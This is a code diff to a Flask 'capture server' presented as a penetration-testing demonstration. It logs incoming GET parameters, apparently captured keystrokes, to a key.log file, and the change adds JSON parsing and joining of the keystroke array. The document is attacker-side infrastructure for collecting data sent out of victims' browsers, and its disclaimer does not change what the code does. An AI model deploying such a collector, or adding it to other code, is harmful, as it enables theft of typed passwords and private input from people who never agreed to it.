@@ -1,5 +1,7 @@
 """Run a server that takes all GET requests and dumps them."""
 
+from json import loads
+
 from flask import Flask, request, send_from_directory
 
 from flask_cors import CORS
@@ -19,7 +21,13 @@ def route():
 
     with open("key.log", "a") as f:
         if "c" in request.args:
-            keys = replace_entities(request.args.get('c'))
+            keys = loads(replace_entities(request.args.get('c')))
+
+            try:
+                keys = "".join(keys)
+            except Exception:
+                pass
+
             f.write(keys + '\n')
 
     return "WARNING: This site exists to demonstrate a 'capture server' for a penetration tester. Every GET request you send to it will be logged and recorded. Old logs will be deleted after some time, but information you send here is not safe. Use this site for educational purposes only! I am not responsible for any damages caused, as this site will be taken down as frequently as possible to reduce damages."
